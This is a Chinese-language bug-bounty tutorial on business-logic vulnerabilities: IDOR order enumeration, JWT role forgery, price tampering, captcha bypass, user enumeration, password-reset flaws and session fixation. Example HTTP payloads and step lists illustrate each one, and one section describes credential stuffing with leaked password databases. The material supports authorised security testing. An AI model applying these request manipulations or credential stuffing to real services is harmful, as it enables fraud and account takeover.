## 一、越权访问漏洞（SRC高频高赏金）

### 案例1：水平越权 - 订单信息遍历

**目标**：某电商平台订单查询接口  
**赏金**：3000元（中危）

**复现步骤**：

```
1. 用户A登录，查看自己的订单
2. Burp抓包，拦截请求：GET /api/order/detail?order_id=10001
3. 修改 order_id=10002、10003、10004...
4. 返回其他用户的订单详情（收货地址、手机号、商品信息）
```

**Payload示例**：

```http
GET /api/order/detail?order_id=10002 HTTP/1.1
Host: api.shop.com
Cookie: session=xxx
```

> 🔑 **关键点**：后端只校验了"是否登录"，没有校验"该订单是否属于当前用户"。

### 案例2：垂直越权 - 普通用户变管理员

**目标**：某企业管理后台  
**漏洞类型**：JWT权限绕过

```http
# 原始请求头
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
                    eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0.
                    xxxxx

# 修改后的请求头（将role从user改为admin）
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
                    eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiJ9.
                    xxxxx
```

**攻击手法**：

| 手法 | 说明 |
|:---|:---|
| JWT alg=none | 将算法改为 `none`，去除签名部分 |
| JWT弱密钥 | 使用 `hashcat` 爆破JWT密钥，伪造任意用户 |
| 修改payload | 直接修改JWT Payload中的role字段 |

### 案例3：某出行平台司机端越权

**场景**：司机端API可修改乘客信息  
**利用方式**：

```
1. 正常司机接单后获取乘客信息
2. 修改API参数中的 passenger_id
3. 越权查看/修改其他乘客的个人信息
```

## 二、支付逻辑漏洞（直接经济损失）

### 案例4：支付金额篡改

**目标**：某电商平台下单接口  
**赏金**：高危（可造成直接经济损失）

```http
# 原始请求
POST /api/createOrder HTTP/1.1
Content-Type: application/json

{
    "product_id": 1001,
    "price": 1999.00,
    "quantity": 1,
    "total": 1999.00
}

# 修改后的请求（价格篡改）
POST /api/createOrder HTTP/1.1
Content-Type: application/json

{
    "product_id": 1001,
    "price": 0.01,
    "quantity": 1,
    "total": 0.01
}
```

> 💰 该漏洞导致攻击者可以**0.01元购买价值1999元的商品**。

### 案例5：负数金额 / 整数溢出

```json
// 利用整数溢出
{"amount": -100, "operation": "transfer"}
// 可能导致余额增加

// 利用业务逻辑
{"coupon_id": 123, "use_count": 9999}
// 优惠券无限次使用
```

### 案例6：优惠券滥用

| 手法 | 描述 |
|:---|:---|
| 优惠券重复使用 | 同一优惠券码可被多次使用 |
| 优惠券叠加 | 多个高折扣优惠券可同时使用 |
| 优惠券越权 | A用户的优惠券被B用户盗用 |
| 新用户优惠滥用 | 无校验即可反复以新用户身份领取 |

## 三、验证码绕过案例集

### 案例7：验证码可复用

**场景**：某金融APP注册/登录

```
1. 正常获取验证码 123456
2. 输入验证码登录成功
3. 不刷新页面，再次使用同一验证码
4. 仍然可以登录其他账号 ✅（严重缺陷）
```

### 案例8：验证码后端缺失

**场景**：某银行APP修改登录密码

```
1. 前端显示验证码输入框
2. 使用Burp拦截请求
3. 删除验证码参数字段（或传空值）
4. 请求仍然成功 → 任意账号密码重置 🔥
```

### 案例9：验证码长度/类型缺陷

| 缺陷类型 | 测试方法 | 危害 |
|:---|:---|:---|
| 4位纯数字验证码 | Hydra爆破 | 10分钟内可暴力破解 |
| 验证码未过期 | 24小时后仍有效 | 长期有效利用 |
| 验证码返回前端 | 查看响应包中的code字段 | 直接获取验证码 |

## 四、注册/登录逻辑缺陷

### 案例10：用户枚举

```http
# 请求：已注册用户
POST /api/login
{"username": "admin", "password": "wrong"}
# 响应：密码错误

# 请求：未注册用户
POST /api/login
{"username": "nobody", "password": "wrong"}
# 响应：用户名不存在
```

> 通过错误信息差异，可枚举有效用户名，为后续爆破提供字典。

### 案例11：撞库攻击

```
1. 收集已泄露的账号密码库（如社工库）
2. 批量测试目标SRC的登录接口
3. 命中率往往在1%-5%之间
```

> ⚠️ **注意**：撞库可能违反SRC规则，需控制频率，避免触发风控。

### 案例12：密码重置逻辑缺陷

**常见缺陷点**：

```
1. Token可预测（时间戳/用户ID/MD5简单组合）
2. Token直接返回前端（响应包中明文返回）
3. 重置链接不校验用户身份（修改URL中的user_id即可重置他人密码）
4. 旧密码可直接登录（修改密码后session未失效）
```

## 五、会话管理漏洞

### 案例13：会话固定

```
1. 攻击者获取一个未登录的session ID: abc123
2. 诱导用户使用该session ID登录（如通过链接）
3. 攻击者使用同一session ID → 直接进入用户账户
```

### 案例14：会话未过期

| 场景 | 危害 |
|:---|:---|
| 退出后Cookie仍有效 | 攻击者获取Cookie后可永久使用 |
| 修改密码后会话未失效 | 旧设备仍可访问账户 |
| 无超时机制 | 攻击者获取Cookie后72小时内仍可用 |

## 六、SRC逻辑漏洞挖掘方法论

### 6.1 通用挖掘流程

```
1. 梳理业务 → 画出完整的业务流程（注册→登录→下单→支付→售后）
2. 记录接口 → 抓取所有API请求，标注鉴权参数
3. 修改参数 → 逐一尝试修改user_id/order_id/price/role等
4. 观察响应 → 对比修改前后的响应差异
5. 扩大危害 → 尝试组合多个低危漏洞提升危害等级
```

### 6.2 高频测试点清单

| 业务环节 | 测试点 | 常见漏洞 |
|:---|:---|:---|
| 注册 | 验证码、手机号、邮箱 | 验证码绕过、用户枚举 |
| 登录 | 密码、Token、OAuth | 弱口令、撞库、逻辑绕过 |
| 个人中心 | 用户ID、头像上传 | 越权、文件上传 |
| 订单 | 订单ID、金额、数量 | 水平越权、支付篡改 |
| 支付 | 金额、优惠券、积分 | 整数溢出、优惠滥用 |
| 管理员 | 权限标识、菜单 | 垂直越权 |

### 6.3 关注厂商新活动

> 🎯 新上线的项目或活动漏洞比较好挖，因为：
> - 测试不充分，逻辑缺陷多
> - 防御措施尚未完善
> - SRC通常有活动奖励翻倍机制
